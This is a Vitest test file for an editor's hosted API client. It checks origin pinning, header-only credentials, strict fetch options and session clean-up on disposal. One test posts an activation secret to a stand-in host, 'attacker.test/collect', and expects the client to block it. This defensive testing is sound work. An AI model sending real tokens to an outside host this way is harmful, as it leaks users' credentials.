// @vitest-environment jsdom

import { afterEach, describe, expect, it, vi } from 'vitest';
import { AUTHORING_ACTIVATION_GRANT_HEADER, AUTHORING_SESSION_HEADER } from '@lodariq/schema';
import { HostedAuthoringApiClient } from '../../../../apps/editor/src/authoring-api-client';

describe('@lodariq/editor hosted API client', () => {
  afterEach(() => vi.unstubAllGlobals());

  it('pins every request to the configured API origin and keeps credentials in headers', async () => {
    const fetch = vi
      .fn<typeof globalThis.fetch>()
      .mockResolvedValue(
        new Response('{}', { status: 200, headers: { 'content-type': 'application/json' } }),
      );
    vi.stubGlobal('fetch', fetch);
    const client = new HostedAuthoringApiClient('https://api.lodariq.test');
    client.setSessionToken('authoring-session-secret');

    await client.request('/v1/authoring/document', { method: 'GET', useSession: true });
    const [url, init] = fetch.mock.calls[0]!;
    expect(url.toString()).toBe('https://api.lodariq.test/v1/authoring/document');
    expect(new Headers(init?.headers).get(AUTHORING_SESSION_HEADER)).toBe(
      'authoring-session-secret',
    );
    expect(url.toString()).not.toContain('authoring-session-secret');
    expect(init).toMatchObject({
      credentials: 'omit',
      redirect: 'error',
      referrerPolicy: 'no-referrer',
    });

    await expect(
      client.request('https://attacker.test/collect', {
        method: 'POST',
        activationGrant: 'activation-secret',
      }),
    ).rejects.toThrow(/outside the trusted origin/u);
    expect(fetch).toHaveBeenCalledOnce();
    expect(
      new Headers(fetch.mock.calls[0]?.[1]?.headers).has(AUTHORING_ACTIVATION_GRANT_HEADER),
    ).toBe(false);
  });

  it('aborts outstanding requests and forgets the session on disposal', async () => {
    vi.stubGlobal(
      'fetch',
      vi.fn<typeof globalThis.fetch>(
        (_input, init) =>
          new Promise((_resolve, reject) => {
            init?.signal?.addEventListener('abort', () =>
              reject(new DOMException('Aborted', 'AbortError')),
            );
          }),
      ),
    );
    const client = new HostedAuthoringApiClient('https://api.lodariq.test');
    client.setSessionToken('authoring-session-secret');
    const request = client.request('/v1/authoring/document', { useSession: true });
    client.dispose();

    await expect(request).rejects.toMatchObject({ name: 'AbortError' });
    await expect(client.request('/v1/authoring/document', { useSession: true })).rejects.toThrow(
      /session is unavailable/u,
    );
  });
});
